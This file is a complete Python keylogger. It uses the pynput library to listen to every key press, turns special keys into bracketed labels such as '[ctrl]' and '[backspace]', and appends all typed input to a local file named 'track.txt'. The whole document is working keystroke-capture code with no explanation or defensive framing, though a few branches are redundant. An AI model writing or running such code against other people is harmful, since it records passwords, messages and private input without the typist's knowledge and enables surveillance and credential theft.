from pynput.keyboard import Listener

def writeToFile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == "Key.space":
        keydata = " "

    if keydata == "Key.alt":
        keydata = "[alt]"

    if keydata == "Key.alt_gr":
        keydata = "[alt_gr]"

    if keydata == "Key.alt_l":
        keydata = "[alt_l]"

    if keydata == "Key.alt_r":
        keydata = "[alt_r]"

    if keydata == "Key.backspace":
        keydata = "[backspace]"

    if keydata == "Key.caps_lock":
        keydata = "[caps_lock]"

    if keydata == "Key.cmd":
        keydata = "[cmd]"

    if keydata == "Key.cmd_l":
        keydata = "[cmd_l]"

    if keydata == "Key.cmd_r":
        keydata = "[cmd_r]"

    if keydata == "Key.ctrl":
        keydata = "[ctrl]"

    if keydata == "Key.ctrl_l":
        keydata = "[ctrl_l]"

    if keydata == "Key.ctrl_r":
        keydata = "[ctrl_r]"

    if keydata == "Key.delete":
        keydata = "[delete]"

    if keydata == "Key.down":
        keydata = "[down]"

    if keydata == "Key.end":
        keydata = "[end]"

    if keydata == "Key.enter":
        keydata = "[enter]"

    if keydata == "Key.esc":
        keydata = "[esc]"

    if keydata == "Key.f1":
        keydata = "[f1]"

    if keydata == "Key.home":
        keydata = "[home]"

    if keydata == "Key.insert":
        keydata = "[insert]"

    if keydata == "Key.left":
        keydata = "[left]"

    if keydata == "Key.menu":
        keydata = "[menu]"

    if keydata == "Key.num_lock":
        keydata = "[num_lock]"

    if keydata == "Key.page_down":
        keydata = "[page_down]"

    if keydata == "Key.page_up":
        keydata = "[page_up]"

    if keydata == "Key.pause":
        keydata = "[pause]"

    if keydata == "Key.print_screen":
        keydata = "[print_screen]"

    if keydata == "Key.right":
        keydata = "[right]"

    if keydata == "Key.scroll_lock":
        keydata = "[scroll_lock]"

    if keydata == "Key.shift":
        keydata = "[shift]"

    if keydata == "Key.shift_l":
        keydata = "[shift_l]"

    if keydata == "Key.shift_r":
        keydata = "[shift_r]"

    if keydata == "Key.space":
        keydata = "[space]"

    if keydata == "Key.tab":
        keydata = "[tab]"

    if keydata == "Key.up":
        keydata = "[up]"

    if keydata == "Key.enter":
        keydata = "\n"

    with open("track.txt", "a") as file:
        file.write(keydata)

with Listener(on_press = writeToFile) as listen:
    listen.join()